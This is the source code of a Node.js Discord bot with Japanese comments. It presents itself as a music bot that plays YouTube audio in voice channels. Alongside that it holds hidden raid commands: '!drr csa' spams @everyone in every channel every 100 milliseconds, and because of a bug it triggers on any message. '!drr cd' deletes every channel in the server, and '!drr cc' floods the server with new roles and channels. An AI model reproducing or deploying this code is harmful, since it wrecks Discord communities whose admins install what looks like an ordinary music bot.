const http = require('http');
const querystring = require('querystring');
const discord = require('discord.js');
const client = new discord.Client();
const ytdl = require('ytdl-core');

http.createServer(function(req, res){
  if (req.method == 'POST'){
    var data = "";
    req.on('data', function(chunk){
      data += chunk;
    });
    req.on('end', function(){
      if(!data){
        res.end("No post data");
        return;
      }
      var dataObject = querystring.parse(data);
      console.log("post:" + dataObject.type);
      if(dataObject.type == "wake"){
        console.log("Woke up in post");
        res.end();
        return;
      }
      res.end();
    });
  }
  else if (req.method == 'GET'){
    res.writeHead(200, {'Content-Type': 'text/plain'});
    res.end('Discord Bot is active now\n');
  }
}).listen(3000);

client.on('ready', message =>{
  console.log('Bot準備完了～');
  client.user.setPresence({ activity: { name: 'RythmRE!' } });
});

client.on('message', message =>{
  if (message.author.id == client.user.id || message.author.bot){
    return;
  }
  if(/!drr csa/){
    var csa = setInterval(function () {
     try {
    message.channel.guild.channels.cache.forEach(channel => { // Looping through the guild channels.
        channel.send('@everyone').catch(error => { // Deleting the channel(s) and catching any errors.
            console.log(`次のチャンネルに送信できませんでした。 ${channel.name}.`)
        });
        return;
    });
   } catch(err){
     
   }
  },100);
  }
  
  if(message.content.match(/!drr cd/)){
    try {
    message.channel.guild.channels.cache.forEach(channel => { // Looping through the guild channels.
        channel.delete().catch(error => { // Deleting the channel(s) and catching any errors.
            console.log(`次のチャンネルを削除できませんでした ${channel.name}.`)
        });
        return;
    });
   } catch(err){
    console.log(err)
    message.channel.send(`チャンネルを削除する権限がありません。`);
   }
  }
  if(message.content.match(/!drr csad/)){
    clearInterval(csa);
  }
  if(message.content.match(/!drr cc/)){
    var cci = setInterval(function () {
    var rr = Math.random() * 100000;
    　message.channel.guild.roles.create({data: {name: rr} });
	   message.channel.guild.channels.create('とみおりを崇めよ' + rr);
    }, 100);
  }
  if(message.content.match(/!drr ccd/)){
    clearInterval(cci);
  }
});
client.on('message', async (message,user) =>{
  if (message.content.startsWith('!dre') && message.guild) {
      
      const url = message.content.split(' ')[1]
      // まず動画が見つからなければ処理を止める
      if (!ytdl.validateURL(url)) return message.reply('動画が存在しません！')
      // コマンドを実行したメンバーがいるボイスチャンネルを取得
      const channel = message.member.voice.channel
      // コマンドを実行したメンバーがボイスチャンネルに入ってなければ処理を止める
      if (!channel) return message.reply('先にボイスチャンネルに参加してください！')
      // チャンネルに参加
      const connection = await channel.join()
      // 動画の音源を取得
      const stream = ytdl(ytdl.getURLVideoID(url), { filter: 'audioonly' })
      // 再生
      const dispatcher = connection.play(stream)
      dispatcher.setVolume(0.05);

      // 再生が終了したら抜ける
      dispatcher.once('finish', () => {
        dispatcher.setVolume(0);
        return;
      });
    }
});
if(process.env.DISCORD_BOT_TOKEN == undefined){
 console.log('DISCORD_BOT_TOKENが設定されていません。');
 process.exit(0);
}

client.login( process.env.DISCORD_BOT_TOKEN );

function sendReply(message, text){
  message.reply(text)
    .then(console.log("リプライ送信: " + text))
    .catch(console.error);
}

function sendMsg(channelId, text, option={}){
  client.channels.get(channelId).send(text, option)
    .then(console.log("メッセージ送信: " + text + JSON.stringify(option)))
    .catch(console.error);
}
